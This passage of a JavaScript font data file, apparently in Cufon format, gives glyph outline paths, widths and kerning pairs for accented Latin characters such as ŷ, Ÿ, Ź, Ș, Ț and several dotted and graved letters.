"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u0177":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm56,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u0178":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm26,-301r36,0r0,37r-36,0r0,-37xm83,-301r37,0r0,37r-37,0r0,-37","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u0179":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm74,-306r41,0r-39,42r-28,0","w":133,"k":{"-":5,"\u00ad":5}},"\u017a":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm74,-306r41,0r-39,42r-28,0","w":133,"k":{"-":5,"\u00ad":5}},"\u017b":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm49,-301r36,0r0,37r-36,0r0,-37","w":133,"k":{"-":5,"\u00ad":5}},"\u017c":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm49,-301r36,0r0,37r-36,0r0,-37","w":133,"k":{"-":5,"\u00ad":5}},"\u017d":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm15,-306r35,0r17,21r17,-21r36,0r-34,42r-38,0","w":133,"k":{"-":5,"\u00ad":5}},"\u017e":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36xm15,-306r35,0r17,21r17,-21r36,0r-34,42r-38,0","w":133,"k":{"-":5,"\u00ad":5}},"\u01fc":{"d":"91,0r0,-46r-40,0r-12,46r-38,0r68,-252r130,0r0,36r-69,0r0,70r55,0r0,36r-55,0r0,74r69,0r0,36r-108,0xm60,-80r31,0r0,-121xm111,-306r41,0r-39,42r-28,0","w":208},"\u01fd":{"d":"91,0r0,-46r-40,0r-12,46r-38,0r68,-252r130,0r0,36r-69,0r0,70r55,0r0,36r-55,0r0,74r69,0r0,36r-108,0xm60,-80r31,0r0,-121xm111,-306r41,0r-39,42r-28,0","w":208},"\u01fe":{"d":"24,-17v-25,-38,-8,-117,-13,-175v-5,-55,53,-77,96,-54r7,-19r14,4r-10,26v26,37,8,117,13,175v5,55,-53,77,-96,54r-7,19r-13,-4xm51,-194r0,104r40,-112v-6,-24,-40,-24,-40,8xm51,-50v5,25,41,24,41,-8r0,-104xm78,-306r41,0r-39,42r-28,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u01ff":{"d":"24,-17v-25,-38,-8,-117,-13,-175v-5,-55,53,-77,96,-54r7,-19r14,4r-10,26v26,37,8,117,13,175v5,55,-53,77,-96,54r-7,19r-13,-4xm51,-194r0,104r40,-112v-6,-24,-40,-24,-40,8xm51,-50v5,25,41,24,41,-8r0,-104xm78,-306r41,0r-39,42r-28,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0218":{"d":"62,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26xm9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0219":{"d":"62,49r-14,0r0,-37r37,0r0,33v-10,10,-10,30,-33,26xm9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u021a":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm61,49r-15,0r0,-37r37,0r0,33v-10,10,-9,30,-33,26","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u021b":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm61,49r-15,0r0,-37r37,0r0,33v-10,10,-9,30,-33,26","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0237":{"d":"4,0r0,-36v21,1,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63","w":92,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u02c6":{"d":"28,-264r-35,0r33,-42r38,0r34,42r-36,0r-17,-21","w":90},"\u02c7":{"d":"-7,-306r35,0r17,21r17,-21r36,0r-34,42r-38,0","w":90},"\u02d8":{"d":"63,-306r24,0v0,27,-14,43,-42,43v-28,0,-42,-16,-42,-43r24,0v0,24,36,24,36,0","w":90},"\u02d9":{"d":"27,-301r36,0r0,37r-36,0r0,-37","w":90},"\u02da":{"d":"15,-293v0,-17,13,-30,30,-30v17,0,30,13,30,30v0,17,-13,30,-30,30v-17,0,-30,-13,-30,-30xm45,-305v-17,0,-14,23,0,23v6,0,12,-5,12,-11v0,-6,-6,-12,-12,-12","w":90},"\u02db":{"d":"17,27v-2,-13,16,-36,43,-30v-26,16,-7,37,13,28r0,20v-20,8,-58,6,-56,-18","w":90},"\u02dc":{"d":"78,-305r21,15v-17,38,-45,24,-72,16v-7,0,-10,3,-15,12r-21,-15v17,-38,45,-24,72,-16v7,0,10,-3,15,-12","w":90},"\u02dd":{"d":"11,-306r38,0r-32,42r-25,0xm60,-306r38,0r-31,42r-26,0","w":90},"\u1e02":{"d":"14,-252v65,-2,119,-6,119,67v0,26,-8,43,-26,51v49,19,43,146,-30,134r-63,0r0,-252xm97,-61v0,-39,-5,-59,-43,-52r0,77v24,0,43,5,43,-25xm93,-176v0,-33,-8,-45,-39,-40r0,67v24,1,39,0,39,-27xm49,-301r36,0r0,37r-36,0r0,-37","w":146,"k":{"\u2026":2,"\u201e":2,"\u201d":4,"\u201c":4,"\u201a":2,"\u2019":4,"\u2018":4,"x":1,"v":1,"X":1,"V":1,".":2,",":2,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5}},"\u1e03":{"d":"14,-252v65,-2,119,-6,119,67v0,26,-8,43,-26,51v49,19,43,146,-30,134r-63,0r0,-252xm97,-61v0,-39,-5,-59,-43,-52r0,77v24,0,43,5,43,-25xm93,-176v0,-33,-8,-45,-39,-40r0,67v24,1,39,0,39,-27xm49,-301r36,0r0,37r-36,0r0,-37","w":146,"k":{"\u2026":2,"\u201e":2,"\u201d":4,"\u201c":4,"\u201a":2,"\u2019":4,"\u2018":4,"x":1,"v":1,"X":1,"V":1,".":2,",":2,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5}},"\u1e0a":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132xm51,-301r37,0r0,37r-37,0r0,-37","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u1e0b":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132xm51,-301r37,0r0,37r-37,0r0,-37","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u1e1e":{"d":"54,-216r0,76r51,0r0,36r-51,0r0,104r-40,0r0,-252r105,0r0,36r-65,0xm47,-301r37,0r0,37r-37,0r0,-37","w":123,"k":{"\u2026":25,"\u201e":25,"\u201a":25,"}":-2,"]":-2,".":25,",":25,")":-2,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":14,"\u01fc":14,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":14,"\u01fd":14,"J":7,"\u0132":7,"\u0134":7,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"j":7,"\u0133":7,"\u0135":7,"\u0237":7,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},"\u1e1f":{"d":"54,-216r0,76r51,0r0,36r-51,0r0,104r-40,0r0,-252r105,0r0,36r-65,0xm47,-301r37,0r0,37r-37,0r0,-37","w":123,"k":{"\u2026":25,"\u201e":25,"\u201a":25,"}":-2,"]":-2,".":25,",":25,")":-2,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":14,"\u01fc":14,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":14,"\u01fd":14,"J":7,"\u0132":7,"\u0134":7,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"j":7,"\u0133":7,"\u0135":7,"\u0237":7,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},"\u1e40":{"d":"69,-252r29,179r27,-179r55,0r0,252r-37,0r0,-181r-27,181r-38,0r-29,-178r0,178r-35,0r0,-252r55,0xm79,-301r37,0r0,37r-37,0r0,-37","w":194},"\u1e41":{"d":"69,-252r29,179r27,-179r55,0r0,252r-37,0r0,-181r-27,181r-38,0r-29,-178r0,178r-35,0r0,-252r55,0xm79,-301r37,0r0,37r-37,0r0,-37","w":194},"\u1e56":{"d":"14,-252v63,-3,118,-3,118,62v0,63,-11,103,-78,95r0,95r-40,0r0,-252xm92,-192v1,-27,-15,-24,-38,-24r0,85v22,0,38,4,38,-23r0,-38xm50,-301r37,0r0,37r-37,0r0,-37","w":135,"k":{"\u2026":29,"\u201e":29,"\u201a":29,"x":4,"X":4,".":29,",":29,"Y":1,"\u00dd":1,"\u0176":1,"\u0178":1,"\u1ef2":1,"y":1,"\u00fd":1,"\u00ff":1,"\u0177":1,"\u1ef3":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":11,"\u01fc":11,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":11,"\u01fd":11,"J":6,"\u0132":6,"\u0134":6,"j":6,"\u0133":6,"\u0135":6,"\u0237":6}},"\u1e57":{"d":"14,-252v63,-3,118,-3,118,62v0,63,-11,103,-78,95r0,95r-40,0r0,-252xm92,-192v1,-27,-15,-24,-38,-24r0,85v22,0,38,4,38,-23r0,-38xm50,-301r37,0r0,37r-37,0r0,-37","w":135,"k":{"\u2026":29,"\u201e":29,"\u201a":29,"x":4,"X":4,".":29,",":29,"Y":1,"\u00dd":1,"\u0176":1,"\u0178":1,"\u1ef2":1,"y":1,"\u00fd":1,"\u00ff":1,"\u0177":1,"\u1ef3":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":11,"\u01fc":11,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":11,"\u01fd":11,"J":6,"\u0132":6,"\u0134":6,"j":6,"\u0133":6,"\u0135":6,"\u0237":6}},"\u1e60":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm49,-301r37,0r0,37r-37,0r0,-37","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u1e61":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm49,-301r37,0r0,37r-37,0r0,-37","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u1e6a":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm46,-301r37,0r0,37r-37,0r0,-37","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u1e6b":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm46,-301r37,0r0,37r-37,0r0,-37","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u1e80":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm53,-306r42,0r26,42r-30,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1e81":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm53,-306r42,0r26,42r-30,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1e82":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm108,-306r41,0r-39,42r-28,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1e83":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm108,-306r41,0r-39,42r-28,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1e84":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm54,-301r37,0r0,37r-37,0r0,-37xm112,-301r36,0r0,37r-36,0r0,-37","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1e85":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm54,-301r37,0r0,37r-37,0r0,-37xm112,-301r36,0r0,37r-36,0r0,-37","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u1ef2":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm24,-306r43,0r26,42r-30,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u1ef3":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm24,-306r43,0r26,42r-30,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\